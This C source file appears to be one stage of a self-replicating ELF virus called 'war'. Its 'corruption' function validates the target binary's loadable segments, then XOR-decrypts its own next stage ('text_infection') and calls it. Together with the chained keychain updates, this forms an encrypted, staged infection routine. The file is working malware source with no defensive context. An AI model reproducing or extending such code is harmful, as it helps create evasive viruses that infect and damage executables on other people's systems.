#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline Elf64_Phdr *get_segment(const struct s_host *host, const size_t index)
{
	Elf64_Phdr *segment;

	segment = (Elf64_Phdr *)((void *)host->header + sizeof(Elf64_Ehdr) + (sizeof(Elf64_Phdr) * index));

	if ((void *)segment >= (void *)host->header + host->filesize)
		segment = NULL;

	return segment;
}

__attribute__((always_inline)) static inline bool is_loadable_segment(const Elf64_Phdr *segment)
{
	return segment->p_type == PT_LOAD;
}

__attribute__((always_inline)) static inline bool is_segment_corrupted(const Elf64_Phdr *segment, const size_t filesize)
{
	if (segment->p_offset >= filesize)
		return true;
	if (segment->p_filesz >= filesize)
		return true;
	if (segment->p_offset + segment->p_filesz >= filesize)
		return true;

	return false;
}

__attribute__((always_inline)) static inline void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size)
{
	for (register size_t index = 0; index < size; index++)
		callee[index] ^= keychain->key[RIGHT];
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void corruption(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
#if LOGGER
	MID_LOGGER("corruption:\t\t");
#endif
	
	decrypt_right(keychain, (char *)criteria, (void *)corruption - (void *)criteria);

	if (context == FAILURE)
		goto label;

	Elf64_Phdr *segment = NULL;

	for (register Elf64_Half index = 0; index < host->header->e_phnum; index++)
	{
		if ((segment = get_segment(host, index)) == NULL)
			break;

		if (is_loadable_segment(segment) == true)
		{
			if (is_segment_corrupted(segment, host->filesize) == true)
			{
				segment = NULL;
				break ;
			}
		}
	}

	if (segment == NULL)
	{
		context = FAILURE;
		goto label;
	}

label:
	update_keychain_right(keychain, (char *)corruption, (void *)text_infection - (void *)corruption);
	decrypt_right(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);

	text_infection(host, keychain, context);
}
